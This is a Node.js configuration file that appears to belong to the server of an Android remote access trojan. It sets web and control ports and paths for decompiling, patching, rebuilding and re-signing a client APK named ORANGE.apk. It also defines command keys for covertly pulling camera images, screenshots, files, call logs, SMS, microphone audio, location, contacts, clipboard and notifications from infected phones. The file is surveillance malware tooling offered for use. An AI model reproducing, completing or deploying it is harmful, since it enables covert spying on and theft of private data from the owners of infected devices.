const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/ORANGE.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'apksigner.jar');
exports.signKey = path.join(__dirname, '../app/factory/', 'signkey.jks');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/ORANGE/IOSocket.smali');

exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = `java -jar ${exports.apkSign} sign --ks ${exports.signKey} --out ${exports.apkSignedBuildPath} ${exports.apkBuildPath}`; // <-- fix output

exports.messageKeys = {
    camera: '0xCA',
    screenshot:'0xV2Q',
    files: '0xE8R',
    call: '0xC3V',
    sms: '0xT4M',
    mic: '0xP9X',
    location: '0xA7K',
    contacts: '0xD9W',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}